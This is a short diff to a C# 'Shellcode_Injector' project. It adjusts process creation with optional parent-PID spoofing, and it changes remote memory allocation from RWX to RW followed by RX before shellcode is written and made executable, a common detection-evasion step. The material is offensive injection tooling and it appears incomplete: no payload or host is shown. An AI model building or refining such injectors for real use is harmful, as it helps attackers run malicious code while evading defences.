@@ -20,7 +20,7 @@ namespace Shellcode_Injector
             return sc;
         }
 
-        //Create proc and return the process information struct
+        //Create proc and return the process information struct, its possible to spoof the ppid with an arbirary one
         public static WinApi.PIN StartS(
             bool spoof_ppid = false,
             uint ppid = 0,
@@ -60,7 +60,7 @@ namespace Shellcode_Injector
                     0, 
                     new IntPtr(PTAPP), 
                     ref pproc,
-                    (IntPtr)IntPtr.Size, //(uint)Marshal.SizeOf(phand),
+                    (IntPtr)IntPtr.Size,
                     IntPtr.Zero, 
                     IntPtr.Zero);
 
@@ -113,10 +113,10 @@ namespace Shellcode_Injector
                 IntPtr.Zero, 
                 (uint)sc.Length, 
                 (uint)WinApi.mem.cmt_rv, 
-                (uint)WinApi.mem.rwx);
+                (uint)WinApi.mem.rw);
 
             WinApi.WriteMem(phand, our_place, sc, (uint)sc.Length, out _);
-            WinApi.Protect(phand, our_place, (int)sc.Length, (uint)WinApi.mem.rx, 0);
+            WinApi.Protect(phand, our_place, (int)sc.Length, (uint)WinApi.mem.rx, out _);
             return our_place;
         }
 
